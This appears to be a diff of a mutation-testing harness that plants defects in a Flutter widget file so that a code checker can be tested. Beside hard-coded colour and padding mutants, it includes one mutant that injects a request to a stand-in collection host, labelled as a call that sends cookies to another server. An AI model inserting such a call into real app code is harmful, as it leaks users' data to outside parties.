@@ -203,7 +203,7 @@ export const cases: Record<string, Case> = Object.fromEntries(([
     available: () => process.platform !== "win32" && !!flutterBin(),
     mutate: {
       "hard-coded colour": (f) => edit(f, "order_card.dart", (s) => s.replace("color: scheme.onSurface)", "color: const Color(0xFF1D1B20))")),
-      "no padding: everything inside sits in the corner": (f) => edit(f, "order_card.dart", (s) => s.replace("EdgeInsets.all(Space.lg)", "EdgeInsets.zero")),
+      "no padding: everything inside sits in the corner": (f) => edit(f, "order_card.dart", (s) => s.replace("const EdgeInsets.all(Space.lg)", "EdgeInsets.zero")),
       "planted call that sends cookies to another server": (f) => edit(f, "order_card.dart", (s) => s.replace("  Widget build(BuildContext context) {", "  Widget build(BuildContext context) {\n    HttpClient().getUrl(Uri.parse('https://collect.example/'));")),
     },
   },
@@ -216,7 +216,7 @@ const mutants: { name: string; mutate: (f: Files, c: Case) => Files; fails: Chec
     name: "hard-coded colour",
     mutate: (f, c) => edit(f, c.style, (s) => s.replace(/(\n\s*color: )var\(--[\w-]+, (#[0-9a-f]{6})\)/, "$1$2")),
     fails: "colors",
-    detail: /#[0-9a-f]{6}/,
+    detail: /#[0-9a-f]{6}|0x[0-9a-f]{8}/i,
   },
   {
     name: "wrong text",
